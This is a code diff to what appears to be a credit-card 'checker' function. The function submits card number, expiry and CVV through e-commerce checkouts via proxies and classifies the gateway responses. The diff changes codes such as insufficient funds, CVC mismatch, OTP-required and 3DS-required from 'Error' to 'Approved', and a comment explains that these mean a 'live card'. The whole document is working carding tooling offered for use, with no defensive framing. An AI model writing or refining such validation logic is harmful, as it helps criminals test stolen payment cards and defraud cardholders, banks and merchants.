@@ -1905,9 +1905,9 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
                         if _fc == "CAPTCHA_REQUIRED":
                             return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": rec}
                         # Approval codes check
-                        _neg_approval = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC"}
-                        if _fc in _neg_approval or "INSUFFICIENT" in _fc or "CVC" in _fc or "CVV" in _fc:
-                            return {"status": "Error", "message": _fc, "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": rec}
+                        _neg_approval = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC", "OTP_REQUIRED", "3DS_REQUIRED"}
+                        if _fc in _neg_approval or "INSUFFICIENT" in _fc or "CVC" in _fc or "CVV" in _fc or "OTP" in _fc or "3DS" in _fc:
+                            return {"status": "Approved", "message": _fc, "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": rec}
                         return {"status": "Declined", "message": "Card declined", "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": rec}
                 return {"status": "Error", "message": "Poll timeout", "product": product_title, "price": price}
             elif receipt.get("__typename") == "FailedReceipt":
@@ -1916,9 +1916,9 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
                 if _fc == "CAPTCHA_REQUIRED":
                     return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": receipt}
                 # Approval codes check
-                _neg_approval2 = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC"}
-                if _fc in _neg_approval2 or "INSUFFICIENT" in _fc or "CVC" in _fc or "CVV" in _fc:
-                    return {"status": "Error", "message": _fc, "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": receipt}
+                _neg_approval2 = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC", "OTP_REQUIRED", "3DS_REQUIRED"}
+                if _fc in _neg_approval2 or "INSUFFICIENT" in _fc or "CVC" in _fc or "CVV" in _fc or "OTP" in _fc or "3DS" in _fc:
+                    return {"status": "Approved", "message": _fc, "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": receipt}
                 return {"status": "Declined", "message": "Card declined", "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": receipt}
             elif receipt.get("__typename") == "ActionRequiredReceipt":
                 return {"status": "Approved", "message": "3DS Required", "error_code": "3DS_REQUIRED", "product": product_title, "price": price, "raw_receipt": receipt}
@@ -2041,8 +2041,10 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
             _approval_codes = {
                 "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS",
                 "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVC",
+                "PAYMENTS_CREDIT_CARD_BASE_INCORRECT_CVC",   # FIX: was missing → fell to decline_hits
+                "PAYMENTS_CREDIT_CARD_BASE_OTP_REQUIRED",    # FIX: OTP = live card, not decline
+                "PAYMENTS_CREDIT_CARD_BASE_3DS_REQUIRED",    # FIX: 3DS via errors[] path
                 "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
-                "PAYMENTS_CREDIT_CARD_BASE_INCORRECT_CVC",  # FIX: was falling into decline_hits via startswith() check
             }
             # Gateway decline codes = card rejected by processor → Declined
             _decline_codes = {
@@ -2074,7 +2076,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
             if approval_hits:
                 # Exact gateway code as-it-is return karo
                 _steps.append(f"7. Result: {approval_hits[0]} | code={approval_hits[0]}")
-                return {"status": "Error", "message": approval_hits[0], "error_code": approval_hits[0], "product": product_title, "price": price, "raw_receipt": {"errors": error_codes, "__typename": completion.get("__typename", "SubmitAlreadyAccepted")}, "debug_steps": _steps}
+                return {"status": "Approved", "message": approval_hits[0], "error_code": approval_hits[0], "product": product_title, "price": price, "raw_receipt": {"errors": error_codes, "__typename": completion.get("__typename", "SubmitAlreadyAccepted")}, "debug_steps": _steps}
             if decline_hits:
                 # Card was declined by gateway
                 _steps.append(f"7. Result: DECLINED | code={decline_hits[0]}")
@@ -2118,9 +2120,9 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
             _erm = _err.get("messageUntranslated", "") or ""
             if _erc == "CAPTCHA_REQUIRED":
                 return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": receipt, "debug_steps": _steps}
-            _dr_approval = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC"}
-            if _erc in _dr_approval or "INSUFFICIENT" in _erc or "CVC" in _erc or "CVV" in _erc:
-                return {"status": "Error", "message": _erc, "error_code": _erc, "gateway_message": _erm or None, "product": product_title, "price": price, "raw_receipt": receipt, "debug_steps": _steps}
+            _dr_approval = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC", "OTP_REQUIRED", "3DS_REQUIRED"}
+            if _erc in _dr_approval or "INSUFFICIENT" in _erc or "CVC" in _erc or "CVV" in _erc or "OTP" in _erc or "3DS" in _erc:
+                return {"status": "Approved", "message": _erc, "error_code": _erc, "gateway_message": _erm or None, "product": product_title, "price": price, "raw_receipt": receipt, "debug_steps": _steps}
             return {"status": "Declined", "message": "Card declined", "error_code": _erc, "gateway_message": _erm or None, "product": product_title, "price": price, "raw_receipt": receipt, "debug_steps": _steps}
         if receipt.get("__typename") == "ProcessingReceipt":
             poll_delay = 0.3  # Start fast, back off
@@ -2152,11 +2154,11 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
                         return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
                     
                     # Classify FailedReceipt codes — exact code as-it-is return karo
-                    approval_codes = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC"}
+                    approval_codes = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC", "OTP_REQUIRED", "3DS_REQUIRED"}
                     
-                    if code in approval_codes or "INSUFFICIENT" in code or "CVC" in code or "CVV" in code:
+                    if code in approval_codes or "INSUFFICIENT" in code or "CVC" in code or "CVV" in code or "OTP" in code or "3DS" in code:
                         _steps.append(f"7. Receipt: {code} | code={code} | msg={msg_orig}")
-                        return {"status": "Error", "message": code, "error_code": code, "gateway_message": msg_orig or None, "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
+                        return {"status": "Approved", "message": code, "error_code": code, "gateway_message": msg_orig or None, "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
                     
                     _steps.append(f"7. Receipt: DECLINED | code={code} | msg={msg_orig}")
                     return {"status": "Declined", "message": "Card declined", "error_code": code, "gateway_message": msg_orig or None, "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
